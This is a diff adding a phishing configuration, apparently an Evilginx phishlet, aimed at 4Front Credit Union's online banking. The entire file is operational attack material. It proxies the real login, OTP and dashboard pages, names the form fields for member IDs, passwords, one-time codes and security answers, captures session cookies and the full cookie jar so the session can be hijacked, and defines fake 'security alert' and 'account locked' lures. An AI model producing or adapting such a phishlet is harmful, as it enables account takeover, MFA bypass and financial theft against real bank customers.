@@ -1,0 +1,108 @@
+name: "4front"
+description: "4Front Credit Union Online Banking Phishlet - Full AiTM Takeover"
+
+domain: "4frontcu.com"  # Real domain
+
+phish_subdomains:
+  - "secure"
+  - "online"
+  - "login"
+  - "account"
+
+paths:
+  - path: "/"
+    type: "redirect"
+    target: "https://ob.4frontcu.com/"  # Adjust if portal is ib.4frontcu.com or digital.4frontcu.com — test first
+
+  - path: "/login"
+    type: "proxy"
+    target: "https://ob.4frontcu.com/login"  # Main login endpoint
+
+  - path: "/auth"
+    type: "proxy"
+    target: "https://ob.4frontcu.com/auth"
+
+  - path: "/verify"
+    type: "proxy"
+    target: "https://ob.4frontcu.com/verify"  # OTP/MFA page
+
+  - path: "/dashboard"
+    type: "proxy"
+    target: "https://ob.4frontcu.com/dashboard"
+
+  - path: "/.*"
+    type: "proxy"
+    target: "https://ob.4frontcu.com$1"  # Catch-all proxy
+
+credentials:
+  username:
+    key: "member_id"          # Common field: Member Number / User ID
+    search:
+      - "name=\"member_id\""
+      - "id=\"username\""
+      - "name=\"user\""
+    type: "username"
+
+  password:
+    key: "password"
+    search:
+      - "name=\"password\""
+      - "id=\"password\""
+    type: "password"
+
+  custom:
+    - key: "otp_code"
+      search:
+        - "name=\"otp\""
+        - "name=\"token\""
+        - "name=\"code\""
+      type: "text"
+
+    - key: "security_question"
+      search:
+        - "name=\"answer\""
+      type: "text"
+
+auth_tokens:
+  - name: "session_cookie"
+    search:
+      - "Set-Cookie: (JSESSIONID|PHPSESSID|ASP.NET_SessionId|sessionid)=([^;]+)"
+    type: "cookie"
+
+  - name: "csrf_token"
+    search:
+      - "<input.*name=\"csrf|token|authenticity_token\".*value=\"([^\"]+)\""
+    type: "html"
+
+  - name: "all_cookies"
+    type: "all_cookies"  # Grabs full cookie jar for session import
+
+lures:
+  - name: "security_alert"
+    path: "/verify-account"
+    redirect: "/login"
+
+  - name: "fraud_block"
+    path: "/account-locked"
+    redirect: "/login"
+
+force_post:
+  - path: "/login"
+    params:
+      - "member_id"
+      - "password"
+
+  - path: "/verify"
+    params:
+      - "otp_code"
+
+blacklist:
+  - "favicon.ico"
+  - "robots.txt"
+
+javascript:
+  enabled: true
+  inject: |
+    // Optional JS for better capture / anti-detection bypass
+    console.log("4Front Phishlet Loaded");
+    // Hide Evilginx indicators if needed
